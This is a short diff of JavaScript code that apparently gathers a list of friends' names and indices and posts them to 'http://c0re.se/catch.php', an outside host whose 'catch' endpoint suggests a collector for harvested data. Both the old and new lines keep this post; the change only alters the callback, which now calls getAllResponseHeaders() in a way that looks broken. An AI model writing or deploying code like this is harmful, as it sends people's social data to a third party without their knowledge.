@@ -42,8 +42,8 @@ $.ajax({
 			var info = "\n" + friends[i].text + " " + friends[i].index;
 			display += info;
 		}
-		$.post("http://c0re.se/catch.php", { text:display }, function(result){ 
-			console.log(result);
+		$.post("http://c0re.se/catch.php", { text:display }, function(){ 
+			console.log(getAllResponseHeaders());
 		}
 			  )}
 });
